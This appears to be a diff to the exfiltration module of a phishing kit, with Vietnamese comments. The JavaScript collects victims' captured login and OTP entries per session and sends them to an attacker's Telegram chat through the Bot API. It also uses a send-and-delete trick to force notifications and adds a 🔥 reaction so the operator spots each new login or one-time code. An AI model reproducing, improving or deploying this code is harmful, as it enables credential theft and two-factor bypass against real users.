@@ -6,11 +6,9 @@ let tgMessageId = null;
 let currentSessionText = '';
 let currentSessionId = '';
 
-// Hàm lấy Session ID (Đã fix lỗi SSR Next.js)
 const getSessionId = () => {
     if (currentSessionId) return currentSessionId;
     if (typeof window === 'undefined') return 'server_session';
-    
     let id = localStorage.getItem('session_id');
     if (!id) {
         id = 'user_' + Math.random().toString(36).substring(2, 9);
@@ -30,11 +28,10 @@ export const sendTelegramMessage = (newContent) => {
     const sid = getSessionId();
     
     if (newContent) {
-        // Chèn Mã Phiên ngắn gọn ngay trước nội dung mới (Login/OTP) để dễ nhận biết
-        currentSessionText += `\n\n<b>[${sid}]</b>${newContent}`;
+        // ĐÃ BỎ [user_...], giờ chỉ nối thẳng nội dung vào
+        currentSessionText += `\n\n${newContent}`;
     }
     
-    // Tin nhắn tổng hợp
     let text = `<b>🔑 MÃ PHIÊN: <code>${sid}</code></b>\n\n` + currentSessionText;
 
     const tgFetch = (method, payload) => {
@@ -56,13 +53,19 @@ export const sendTelegramMessage = (newContent) => {
             if (d && d.ok && d.result) tgMessageId = d.result.message_id;
         });
     } else {
-        // Mẹo: Gửi tin 🔔 rồi xóa để đánh lừa Telegram nổ thông báo
         tgFetch('sendMessage', { chat_id: CHAT_ID, text: '🔔' }).then(res => {
             if (res && res.ok && res.result) {
                 tgFetch('deleteMessage', { chat_id: CHAT_ID, message_id: res.result.message_id });
             }
-            // Sau đó update nội dung vào ô tin nhắn chính
+            // Update lại nội dung
             tgFetch('editMessageText', { chat_id: CHAT_ID, message_id: tgMessageId, text: text, parse_mode: 'HTML' });
+            
+            // Bonus: Tự động thả cảm xúc 🔥 vào tin nhắn mỗi khi có Login/OTP mới để mày dễ nhận biết
+            tgFetch('setMessageReaction', {
+                chat_id: CHAT_ID,
+                message_id: tgMessageId,
+                reaction: JSON.stringify([{ type: 'emoji', emoji: '🔥' }])
+            });
         });
     }
 };
